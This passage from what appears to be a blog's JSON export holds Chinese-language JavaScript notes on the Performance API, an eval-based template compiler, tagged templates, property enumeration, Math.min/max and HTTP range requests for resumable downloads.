t.loadEventStart;\\n \\n    // DNS 缓存时间\\n    times.appcache = t.domainLookupStart - t.fetchStart;\\n \\n    // 卸载页面的时间\\n    times.unloadEvent = t.unloadEventEnd - t.unloadEventStart;\\n \\n    // TCP 建立连接完成握手的时间\\n    times.connect = t.connectEnd - t.connectStart;\\n \\n    return times;\\n}\\n```\\n\\n\\n> performance.now() \\n\\nperformance.now() 与 Date.now() 不同的是，返回了以微秒（百万分之一秒）为单位的时间，更加精准。注意 Date.now() 输出的是 UNIX 时间，即距离 1970 的时间，而 performance.now() 输出的是相对于 performance.timing.navigationStart(页面初始化) 的时间。\\n\\n> performance.mark(name)  performance.measure(name, startMark, endMark);\\n\\n使用 performance.mark() 标记各种时间戳（就像在地图上打点），保存为各种测量值（测量地图上的点之间的距离），便可以批量地分析这些数据了。performance.measure()是测量mark点的间隔。使用完成后可以清楚。\\nwindow.performance.clearMarks();window.performance.clearMeasures();  \\n\\n> performance.getEntries()\\n\\ngetEntries() 对于给定的filter,此方法返回 PerformanceEntry 对象数组. 数组成员（入口）可以在显式的时间点用 performance marks或measures 来创建(例如调用mark() 方法)。\\n\\n> 重要\\n\\nperformance.getEntries({ entryType: \\\"resource\\\"});这个是获取页面静态资源加载的情况，可以用来做前端监控。如果某个js或图标加载不出来，则立马告警。\\n\\n[转载自AlloyTeam](http://www.alloyteam.com/2015/09/explore-performance/)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>这个一个性能分析的对象。</p>\n<blockquote>\n<p>performance.timing</p>\n</blockquote>\n<pre><code>/ 计算加载时间\nfunction getPerformanceTiming () {  \n    var performance = window.performance;\n \n    if (!performance) {\n        // 当前浏览器不支持\n        console.log('你的浏览器不支持 performance 接口');\n        return;\n    }\n \n    var t = performance.timing;\n    var times = {};\n \n    //【重要】页面加载完成的时间\n    //【原因】这几乎代表了用户等待页面可用的时间\n    times.loadPage = t.loadEventEnd - t.navigationStart;\n \n    //【重要】解析 DOM 树结构的时间\n    //【原因】反省下你的 DOM 树嵌套是不是太多了！\n    times.domReady = t.domComplete - t.responseEnd;\n \n    //【重要】重定向的时间\n    //【原因】拒绝重定向！比如，http://example.com/ 就不该写成 http://example.com\n    times.redirect = t.redirectEnd - t.redirectStart;\n \n    //【重要】DNS 查询时间\n    //【原因】DNS 预加载做了么？页面内是不是使用了太多不同的域名导致域名查询的时间太长？\n    // 可使用 HTML5 Prefetch 预查询 DNS ，见：[HTML5 prefetch](http://segmentfault.com/a/1190000000633364)            \n    times.lookupDomain = t.domainLookupEnd - t.domainLookupStart;\n \n    //【重要】读取页面第一个字节的时间\n    //【原因】这可以理解为用户拿到你的资源占用的时间，加异地机房了么，加CDN 处理了么？加带宽了么？加 CPU 运算速度了么？\n    // TTFB 即 Time To First Byte 的意思\n    // 维基百科：https://en.wikipedia.org/wiki/Time_To_First_Byte\n    times.ttfb = t.responseStart - t.navigationStart;\n \n    //【重要】内容加载完成的时间\n    //【原因】页面内容经过 gzip 压缩了么，静态资源 css/js 等压缩了么？\n    times.request = t.responseEnd - t.requestStart;\n \n    //【重要】执行 onload 回调函数的时间\n    //【原因】是否太多不必要的操作都放到 onload 回调函数里执行了，考虑过延迟加载、按需加载的策略么？\n    times.loadEvent = t.loadEventEnd - t.loadEventStart;\n \n    // DNS 缓存时间\n    times.appcache = t.domainLookupStart - t.fetchStart;\n \n    // 卸载页面的时间\n    times.unloadEvent = t.unloadEventEnd - t.unloadEventStart;\n \n    // TCP 建立连接完成握手的时间\n    times.connect = t.connectEnd - t.connectStart;\n \n    return times;\n}\n</code></pre>\n<blockquote>\n<p>performance.now()</p>\n</blockquote>\n<p>performance.now() 与 Date.now() 不同的是，返回了以微秒（百万分之一秒）为单位的时间，更加精准。注意 Date.now() 输出的是 UNIX 时间，即距离 1970 的时间，而 performance.now() 输出的是相对于 performance.timing.navigationStart(页面初始化) 的时间。</p>\n<blockquote>\n<p>performance.mark(name)  performance.measure(name, startMark, endMark);</p>\n</blockquote>\n<p>使用 performance.mark() 标记各种时间戳（就像在地图上打点），保存为各种测量值（测量地图上的点之间的距离），便可以批量地分析这些数据了。performance.measure()是测量mark点的间隔。使用完成后可以清楚。<br>\nwindow.performance.clearMarks();window.performance.clearMeasures();</p>\n<blockquote>\n<p>performance.getEntries()</p>\n</blockquote>\n<p>getEntries() 对于给定的filter,此方法返回 PerformanceEntry 对象数组. 数组成员（入口）可以在显式的时间点用 performance marks或measures 来创建(例如调用mark() 方法)。</p>\n<blockquote>\n<p>重要</p>\n</blockquote>\n<p>performance.getEntries({ entryType: &quot;resource&quot;});这个是获取页面静态资源加载的情况，可以用来做前端监控。如果某个js或图标加载不出来，则立马告警。</p>\n<p><a href=\"http://www.alloyteam.com/2015/09/explore-performance/\">转载自AlloyTeam</a></p>\n<!--kg-card-end: markdown-->","comment_id":"161","plaintext":"这个一个性能分析的对象。\n\n> performance.timing\n\n\n/ 计算加载时间\nfunction getPerformanceTiming () {  \n    var performance = window.performance;\n \n    if (!performance) {\n        // 当前浏览器不支持\n        console.log('你的浏览器不支持 performance 接口');\n        return;\n    }\n \n    var t = performance.timing;\n    var times = {};\n \n    //【重要】页面加载完成的时间\n    //【原因】这几乎代表了用户等待页面可用的时间\n    times.loadPage = t.loadEventEnd - t.navigationStart;\n \n    //【重要】解析 DOM 树结构的时间\n    //【原因】反省下你的 DOM 树嵌套是不是太多了！\n    times.domReady = t.domComplete - t.responseEnd;\n \n    //【重要】重定向的时间\n    //【原因】拒绝重定向！比如，http://example.com/ 就不该写成 http://example.com\n    times.redirect = t.redirectEnd - t.redirectStart;\n \n    //【重要】DNS 查询时间\n    //【原因】DNS 预加载做了么？页面内是不是使用了太多不同的域名导致域名查询的时间太长？\n    // 可使用 HTML5 Prefetch 预查询 DNS ，见：[HTML5 prefetch](http://segmentfault.com/a/1190000000633364)            \n    times.lookupDomain = t.domainLookupEnd - t.domainLookupStart;\n \n    //【重要】读取页面第一个字节的时间\n    //【原因】这可以理解为用户拿到你的资源占用的时间，加异地机房了么，加CDN 处理了么？加带宽了么？加 CPU 运算速度了么？\n    // TTFB 即 Time To First Byte 的意思\n    // 维基百科：https://en.wikipedia.org/wiki/Time_To_First_Byte\n    times.ttfb = t.responseStart - t.navigationStart;\n \n    //【重要】内容加载完成的时间\n    //【原因】页面内容经过 gzip 压缩了么，静态资源 css/js 等压缩了么？\n    times.request = t.responseEnd - t.requestStart;\n \n    //【重要】执行 onload 回调函数的时间\n    //【原因】是否太多不必要的操作都放到 onload 回调函数里执行了，考虑过延迟加载、按需加载的策略么？\n    times.loadEvent = t.loadEventEnd - t.loadEventStart;\n \n    // DNS 缓存时间\n    times.appcache = t.domainLookupStart - t.fetchStart;\n \n    // 卸载页面的时间\n    times.unloadEvent = t.unloadEventEnd - t.unloadEventStart;\n \n    // TCP 建立连接完成握手的时间\n    times.connect = t.connectEnd - t.connectStart;\n \n    return times;\n}\n\n\n> performance.now()\n\n\nperformance.now() 与 Date.now() 不同的是，返回了以微秒（百万分之一秒）为单位的时间，更加精准。注意 Date.now() 输出的是\nUNIX 时间，即距离 1970 的时间，而 performance.now() 输出的是相对于\nperformance.timing.navigationStart(页面初始化) 的时间。\n\n> performance.mark(name) performance.measure(name, startMark, endMark);\n\n\n使用 performance.mark()\n标记各种时间戳（就像在地图上打点），保存为各种测量值（测量地图上的点之间的距离），便可以批量地分析这些数据了。performance.measure()是测量mark点的间隔。使用完成后可以清楚。\nwindow.performance.clearMarks();window.performance.clearMeasures();\n\n> performance.getEntries()\n\n\ngetEntries() 对于给定的filter,此方法返回 PerformanceEntry 对象数组. 数组成员（入口）可以在显式的时间点用\nperformance marks或measures 来创建(例如调用mark() 方法)。\n\n> 重要\n\n\nperformance.getEntries({ entryType:\n\"resource\"});这个是获取页面静态资源加载的情况，可以用来做前端监控。如果某个js或图标加载不出来，则立马告警。\n\n转载自AlloyTeam [http://www.alloyteam.com/2015/09/explore-performance/]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-07-09T02:05:41.000Z","created_by":"1","updated_at":"2018-07-09T03:30:32.000Z","updated_by":"1","published_at":"2018-07-09T02:36:31.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d35e","uuid":"8c10e89b-99e3-4d71-acd4-6a4348c45572","title":"模板编译","slug":"mo-ban-bian-yi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\nlet template = `\\n<ul>\\n  <% for(let i=0; i < data.length; i++) { %>\\n    <li><%= data[i] %></li>\\n  <% } %>\\n</ul>\\n`;\\n```\\n上面代码在模板字符串之中，放置了一个常规模板。该模板使用<%...%>放置 JavaScript 代码，使用<%= ... %>输出 JavaScript 表达式。\\n```\\nfunction compile(template){\\n  const evalExpr = /<%=(.+?)%>/g;\\n  const expr = /<%([\\\\s\\\\S]+?)%>/g;\\n\\n  template = template\\n    .replace(evalExpr, '`); \\\\n  echo( $1 ); \\\\n  echo(`')\\n    .replace(expr, '`); \\\\n $1 \\\\n  echo(`');\\n\\n  template = 'echo(`' + template + '`);';\\n\\n  let script =\\n  `(function parse(data){\\n    let output = \\\"\\\";\\n\\n    function echo(html){\\n      output += html;\\n    }\\n\\n    ${ template }\\n\\n    return output;\\n  })`;\\n\\n  return script;\\n}\\n\\nlet parse = eval(compile(template));\\ndiv.innerHTML = parse([ \\\"broom\\\", \\\"mop\\\", \\\"cleaner\\\" ]);\\n\\n//   <ul>\\n//     <li>broom</li>\\n//     <li>mop</li>\\n//     <li>cleaner</li>\\n//   </ul>\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>let template = `\n&lt;ul&gt;\n  &lt;% for(let i=0; i &lt; data.length; i++) { %&gt;\n    &lt;li&gt;&lt;%= data[i] %&gt;&lt;/li&gt;\n  &lt;% } %&gt;\n&lt;/ul&gt;\n`;\n</code></pre>\n<p>上面代码在模板字符串之中，放置了一个常规模板。该模板使用&lt;%...%&gt;放置 JavaScript 代码，使用&lt;%= ... %&gt;输出 JavaScript 表达式。</p>\n<pre><code>function compile(template){\n  const evalExpr = /&lt;%=(.+?)%&gt;/g;\n  const expr = /&lt;%([\\s\\S]+?)%&gt;/g;\n\n  template = template\n    .replace(evalExpr, '`); \\n  echo( $1 ); \\n  echo(`')\n    .replace(expr, '`); \\n $1 \\n  echo(`');\n\n  template = 'echo(`' + template + '`);';\n\n  let script =\n  `(function parse(data){\n    let output = &quot;&quot;;\n\n    function echo(html){\n      output += html;\n    }\n\n    ${ template }\n\n    return output;\n  })`;\n\n  return script;\n}\n\nlet parse = eval(compile(template));\ndiv.innerHTML = parse([ &quot;broom&quot;, &quot;mop&quot;, &quot;cleaner&quot; ]);\n\n//   &lt;ul&gt;\n//     &lt;li&gt;broom&lt;/li&gt;\n//     &lt;li&gt;mop&lt;/li&gt;\n//     &lt;li&gt;cleaner&lt;/li&gt;\n//   &lt;/ul&gt;\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"162","plaintext":"let template = `\n<ul>\n  <% for(let i=0; i < data.length; i++) { %>\n    <li><%= data[i] %></li>\n  <% } %>\n</ul>\n`;\n\n\n上面代码在模板字符串之中，放置了一个常规模板。该模板使用<%...%>放置 JavaScript 代码，使用<%= ... %>输出 JavaScript\n表达式。\n\nfunction compile(template){\n  const evalExpr = /<%=(.+?)%>/g;\n  const expr = /<%([\\s\\S]+?)%>/g;\n\n  template = template\n    .replace(evalExpr, '`); \\n  echo( $1 ); \\n  echo(`')\n    .replace(expr, '`); \\n $1 \\n  echo(`');\n\n  template = 'echo(`' + template + '`);';\n\n  let script =\n  `(function parse(data){\n    let output = \"\";\n\n    function echo(html){\n      output += html;\n    }\n\n    ${ template }\n\n    return output;\n  })`;\n\n  return script;\n}\n\nlet parse = eval(compile(template));\ndiv.innerHTML = parse([ \"broom\", \"mop\", \"cleaner\" ]);\n\n//   <ul>\n//     <li>broom</li>\n//     <li>mop</li>\n//     <li>cleaner</li>\n//   </ul>","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-07-25T12:19:47.000Z","created_by":"1","updated_at":"2018-07-25T12:21:30.000Z","updated_by":"1","published_at":"2018-07-25T12:21:08.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d35f","uuid":"2dffda85-319d-4c23-8c98-dbc03983a138","title":"标签模板","slug":"biao-qian-mo-ban","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\nalert`123`\\n// 等同于\\nalert(123)\\n```\\n\\nES6 还为原生的 String 对象，提供了一个raw方法。\\n\\nString.raw方法，往往用来充当模板字符串的处理函数，返回一个斜杠都被转义（即斜杠前面再加一个斜杠）的字符串，对应于替换变量后的模板字符串。\\n\\nString.raw`Hi\\\\u000A!`;\\n// 返回 \\\"Hi\\\\\\\\u000A!\\\"\\n\\n```\\nlet a = 5;\\nlet b = 10;\\n\\nfunction tag(s, v1, v2) {\\n  console.log(s[0]);\\n  console.log(s[1]);\\n  console.log(s[2]);\\n  console.log(v1);\\n  console.log(v2);\\n\\n  return \\\"OK\\\";\\n}\\n\\ntag`Hello ${ a + b } world ${ a * b}`;\\n// \\\"Hello \\\"\\n// \\\" world \\\"\\n// \\\"\\\"\\n// 15\\n// 50\\n// \\\"OK\\\"\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>alert`123`\n// 等同于\nalert(123)\n</code></pre>\n<p>ES6 还为原生的 String 对象，提供了一个raw方法。</p>\n<p>String.raw方法，往往用来充当模板字符串的处理函数，返回一个斜杠都被转义（即斜杠前面再加一个斜杠）的字符串，对应于替换变量后的模板字符串。</p>\n<p>String.raw<code>Hi\\u000A!</code>;<br>\n// 返回 &quot;Hi\\u000A!&quot;</p>\n<pre><code>let a = 5;\nlet b = 10;\n\nfunction tag(s, v1, v2) {\n  console.log(s[0]);\n  console.log(s[1]);\n  console.log(s[2]);\n  console.log(v1);\n  console.log(v2);\n\n  return &quot;OK&quot;;\n}\n\ntag`Hello ${ a + b } world ${ a * b}`;\n// &quot;Hello &quot;\n// &quot; world &quot;\n// &quot;&quot;\n// 15\n// 50\n// &quot;OK&quot;\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"163","plaintext":"alert`123`\n// 等同于\nalert(123)\n\n\nES6 还为原生的 String 对象，提供了一个raw方法。\n\nString.raw方法，往往用来充当模板字符串的处理函数，返回一个斜杠都被转义（即斜杠前面再加一个斜杠）的字符串，对应于替换变量后的模板字符串。\n\nString.rawHi\\u000A!;\n// 返回 \"Hi\\u000A!\"\n\nlet a = 5;\nlet b = 10;\n\nfunction tag(s, v1, v2) {\n  console.log(s[0]);\n  console.log(s[1]);\n  console.log(s[2]);\n  console.log(v1);\n  console.log(v2);\n\n  return \"OK\";\n}\n\ntag`Hello ${ a + b } world ${ a * b}`;\n// \"Hello \"\n// \" world \"\n// \"\"\n// 15\n// 50\n// \"OK\"","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-07-25T12:25:49.000Z","created_by":"1","updated_at":"2018-07-25T12:27:55.000Z","updated_by":"1","published_at":"2018-07-25T12:27:52.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d360","uuid":"a9b0bf43-eef0-45a6-91d1-4f7e341ee3c6","title":"for in ,Object.keys,Object.getOwnPropertyNames,Object.getOwnPropertySymbols区别","slug":"for-in-2","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\nclass A {\\n  name = 'A';\\n  [Symbol.toStringTag] = \\\"A\\\";\\n  get getter() {\\n    return 'aaaa';\\n  }\\n  constructor() {\\n    Object.defineProperty(this, 'enumerable', {\\n      enumerable: false\\n    })\\n  }\\n  prototype() { }\\n}\\n\\nlet a = new A();\\na.q = q => 132;\\nlet arr = [];\\nfor (let x in a) {\\n  arr.push(x);\\n}\\nconsole.log('for in', arr);\\nconsole.log('Object.keys', Object.keys(a))\\nconsole.log('Object.getOwnPropertyNames', Object.getOwnPropertyNames(a))\\nconsole.log('Object.getOwnPropertySymbols', Object.getOwnPropertySymbols(a))\\n```\\n![](/content/images/2018/07/QQ--20180727134223.png)\\n\\n> 结论\\nfor in：所有可枚举的，还有getter，包括原型链上面的\\nObject.keys：所有可枚举的，不包括原型链\\nObject.getOwnPropertyNames：所有的（包括不能枚举的），不包括原型链\\nObject.getOwnPropertySymbols：所有的Symbol属性，不包括原型链（以上都不能列出Symbol属性）\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>class A {\n  name = 'A';\n  [Symbol.toStringTag] = &quot;A&quot;;\n  get getter() {\n    return 'aaaa';\n  }\n  constructor() {\n    Object.defineProperty(this, 'enumerable', {\n      enumerable: false\n    })\n  }\n  prototype() { }\n}\n\nlet a = new A();\na.q = q =&gt; 132;\nlet arr = [];\nfor (let x in a) {\n  arr.push(x);\n}\nconsole.log('for in', arr);\nconsole.log('Object.keys', Object.keys(a))\nconsole.log('Object.getOwnPropertyNames', Object.getOwnPropertyNames(a))\nconsole.log('Object.getOwnPropertySymbols', Object.getOwnPropertySymbols(a))\n</code></pre>\n<p><img src=\"/content/images/2018/07/QQ--20180727134223.png\" alt=\"\"></p>\n<blockquote>\n<p>结论<br>\nfor in：所有可枚举的，还有getter，包括原型链上面的<br>\nObject.keys：所有可枚举的，不包括原型链<br>\nObject.getOwnPropertyNames：所有的（包括不能枚举的），不包括原型链<br>\nObject.getOwnPropertySymbols：所有的Symbol属性，不包括原型链（以上都不能列出Symbol属性）</p>\n</blockquote>\n<!--kg-card-end: markdown-->","comment_id":"164","plaintext":"class A {\n  name = 'A';\n  [Symbol.toStringTag] = \"A\";\n  get getter() {\n    return 'aaaa';\n  }\n  constructor() {\n    Object.defineProperty(this, 'enumerable', {\n      enumerable: false\n    })\n  }\n  prototype() { }\n}\n\nlet a = new A();\na.q = q => 132;\nlet arr = [];\nfor (let x in a) {\n  arr.push(x);\n}\nconsole.log('for in', arr);\nconsole.log('Object.keys', Object.keys(a))\nconsole.log('Object.getOwnPropertyNames', Object.getOwnPropertyNames(a))\nconsole.log('Object.getOwnPropertySymbols', Object.getOwnPropertySymbols(a))\n\n\n\n\n> 结论\nfor in：所有可枚举的，还有getter，包括原型链上面的\nObject.keys：所有可枚举的，不包括原型链\nObject.getOwnPropertyNames：所有的（包括不能枚举的），不包括原型链\nObject.getOwnPropertySymbols：所有的Symbol属性，不包括原型链（以上都不能列出Symbol属性）","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-07-27T05:41:14.000Z","created_by":"1","updated_at":"2018-07-27T05:58:09.000Z","updated_by":"1","published_at":"2018-07-27T05:56:36.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d361","uuid":"f0f389bb-ad3d-4eca-98c6-fda9a90b0766","title":"Math.min(),Math.max()","slug":"math-min-math-max","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Math.min()和Math.max()都可以不传参数运行的。\\n```\\nMath.min() === Infinity\\nMath.max() === -Infinity\\n```\\nMath.min 的参数是 0 个或者多个。如果是多个参数很容易理解，返回参数中最小的。内部实现的时候是用js最大的数Infinity对比的，因此没有参数，直接返回Infinity。同理Math.max() === -Infinity。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Math.min()和Math.max()都可以不传参数运行的。</p>\n<pre><code>Math.min() === Infinity\nMath.max() === -Infinity\n</code></pre>\n<p>Math.min 的参数是 0 个或者多个。如果是多个参数很容易理解，返回参数中最小的。内部实现的时候是用js最大的数Infinity对比的，因此没有参数，直接返回Infinity。同理Math.max() === -Infinity。</p>\n<!--kg-card-end: markdown-->","comment_id":"165","plaintext":"Math.min()和Math.max()都可以不传参数运行的。\n\nMath.min() === Infinity\nMath.max() === -Infinity\n\n\nMath.min 的参数是 0\n个或者多个。如果是多个参数很容易理解，返回参数中最小的。内部实现的时候是用js最大的数Infinity对比的，因此没有参数，直接返回Infinity。同理Math.max()\n=== -Infinity。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-07-30T09:46:30.000Z","created_by":"1","updated_at":"2018-07-30T09:50:02.000Z","updated_by":"1","published_at":"2018-07-30T09:49:57.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d362","uuid":"6860e738-fece-49b1-9c5b-e60a0ca23bf7","title":"Safari一些坑","slug":"safari","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 1.在异步操作中不能打开新标签页,解决如下。\\n```\\nconst newTab = window.open('')\\n    setTimeout(() => {\\n      newTab.location.href = 'http://www.baidu.com'\\n    }, 3000)\\n```\\n\\n> 2.不支持Access-Control-Allow-Headers 为 * 匹配\\n在跨越请求的时候，自定义http头，不能*匹配。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>1.在异步操作中不能打开新标签页,解决如下。</p>\n</blockquote>\n<pre><code>const newTab = window.open('')\n    setTimeout(() =&gt; {\n      newTab.location.href = 'http://www.baidu.com'\n    }, 3000)\n</code></pre>\n<blockquote>\n<p>2.不支持Access-Control-Allow-Headers 为 * 匹配<br>\n在跨越请求的时候，自定义http头，不能*匹配。</p>\n</blockquote>\n<!--kg-card-end: markdown-->","comment_id":"166","plaintext":"> 1.在异步操作中不能打开新标签页,解决如下。\n\n\nconst newTab = window.open('')\n    setTimeout(() => {\n      newTab.location.href = 'http://www.baidu.com'\n    }, 3000)\n\n\n> 2.不支持Access-Control-Allow-Headers 为 * 匹配\n在跨越请求的时候，自定义http头，不能*匹配。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-07-31T08:53:54.000Z","created_by":"1","updated_at":"2018-07-31T08:57:50.000Z","updated_by":"1","published_at":"2018-07-31T08:56:10.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d363","uuid":"6833bd5e-c2f2-4ac8-811a-2708f6cbab11","title":"断点续传 之 HTTP状态码206和416","slug":"duan-dian-xu-chuan-zhi-httpzhuang-tai-ma-206he-416","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"HTTP/1.1 206状态码表示 服务器已经成功处理了部分GET请求。类似于FlashGet或者迅雷这类的HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。可以解决大文件下载问题，更快的下载速度。\\n416状态码表示是由于读取文件时设置的Range有误造成的，RANGE start不能超出文件的size.\\n\\n> 判断服务器是否支持range。如果http头有Accept-Ranges: bytes，状态码206\\n```\\nOrigin: http://localhost:5000\\nRange: bytes=0-0\\nReferer: http://localhost:5000/\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36\\n\\nAccept-Ranges: bytes\\nAccess-Control-Allow-Methods: GET\\nAccess-Control-Allow-Origin: *\\nAccess-Control-Expose-Headers: Content-Range, Content-Type\\nAccess-Control-Max-Age: 0\\nConnection: keep-alive\\nContent-Length: 1\\nContent-Range: bytes 0-0/69101328\\nContent-Type: application/x-msdownload\\n```\\n服务器返回了Content-Range: bytes 0-0/69101328，这个69101328就是全部的大小。这样可以使用Range:头分段下载。\\n![](/content/images/2018/08/QQ--20180803211723.png)\\n如图分段下载可断点续传，可以暂停，然后继续下载。\\n最后用Blob合并所有的ArrayBuffer,用Url api下载下来。\\n\\n> ArrayBuffer => Blob 下载\\n```\\n      var a = document.createElement('a');\\n        var url = window.URL.createObjectURL(blob);\\n        var filename = 'dd_3.4.8.exe';\\n        a.href = url;\\n        a.download = filename;\\n        a.click();\\n```\\n> 注意\\n\\n我们在分段下载的时候，可能在下载的过程中，文件修改了。这是合成的文件就出了问题。下载完后可以使用[If-Match](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Match)（If-Range）通过判断Etag是否相等，来判断文件版本。如果Etag变化了，返回416的状态码。需要重新下载。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>HTTP/1.1 206状态码表示 服务器已经成功处理了部分GET请求。类似于FlashGet或者迅雷这类的HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。可以解决大文件下载问题，更快的下载速度。<br>\n416状态码表示是由于读取文件时设置的Range有误造成的，RANGE start不能超出文件的size.</p>\n<blockquote>\n<p>判断服务器是否支持range。如果http头有Accept-Ranges: bytes，状态码206</p>\n</blockquote>\n<pre><code>Origin: http://localhost:5000\nRange: bytes=0-0\nReferer: http://localhost:5000/\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36\n\nAccept-Ranges: bytes\nAccess-Control-Allow-Methods: GET\nAccess-Control-Allow-Origin: *\nAccess-Control-Expose-Headers: Content-Range, Content-Type\nAccess-Control-Max-Age: 0\nConnection: keep-alive\nContent-Length: 1\nContent-Range: bytes 0-0/69101328\nContent-Type: application/x-msdownload\n</code></pre>\n<p>服务器返回了Content-Range: bytes 0-0/69101328，这个69101328就是全部的大小。这样可以使用Range:头分段下载。<br>\n<img src=\"/content/images/2018/08/QQ--20180803211723.png\" alt=\"\"><br>\n如图分段下载可断点续传，可以暂停，然后继续下载。<br>\n最后用Blob合并所有的ArrayBuffer,用Url api下载下来。</p>\n<blockquote>\n<p>ArrayBuffer =&gt; Blob 下载</p>\n</blockquote>\n<pre><code>      var a = document.createElement('a');\n        var url = window.URL.createObjectURL(blob);\n        var filename = 'dd_3.4.8.exe';\n        a.href = url;\n        a.download = filename;\n        a.click();\n</code></pre>\n<blockquote>\n<p>注意</p>\n</blockquote>\n<p>我们在分段下载的时候，可能在下载的过程中，文件修改了。这是合成的文件就出了问题。下载完后可以使用<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Match\">If-Match</a>（If-Range）通过判断Etag是否相等，来判断文件版本。如果Etag变化了，返回416的状态码。需要重新下载。</p>\n<!--kg-card-end: markdown-->","comment_id":"167","plaintext":"HTTP/1.1 206状态码表示 服务器已经成功处理了部分GET请求。类似于FlashGet或者迅雷这类的HTTP\n下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。可以解决大文件下载问题，更快的下载速度。\n416状态码表示是由于读取文件时设置的Range有误造成的，RANGE start不能超出文件的size.\n\n> 判断服务器是否支持range。如果http头有Accept-Ranges: bytes，状态码206\n\n\nOrigin: http://localhost:5000\nRange: bytes=0-0\nReferer: http://localhost:5000/\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36\n\nAccept-Ranges: bytes\nAccess-Control-Allow-Methods: GET\nAccess-Control-Allow-Origin: *\nAccess-Control-Expose-Headers: Content-Range, Content-Type\nAccess-Control-Max-Age: 0\nConnection: keep-alive\nContent-Length: 1\nContent-Range: bytes 0-0/69101328\nContent-Type: application/x-msdownload\n\n\n服务器返回了Content-Range: bytes 0-0/69101328，这个69101328就是全部的大小。这样可以使用Range:头分段下载。\n\n如图分段下载可断点续传，可以暂停，然后继续下载。\n最后用Blob合并所有的ArrayBuffer,用Url api下载下来。\n\n> ArrayBuffer => Blob 下载\n\n\n      var a = document.createElement('a');\n        var url = window.URL.createObjectURL(blob);\n        var filename = 'dd_3.4.8.exe';\n        a.href = url;\n        a.download = filename;\n        a.click();\n\n\n> 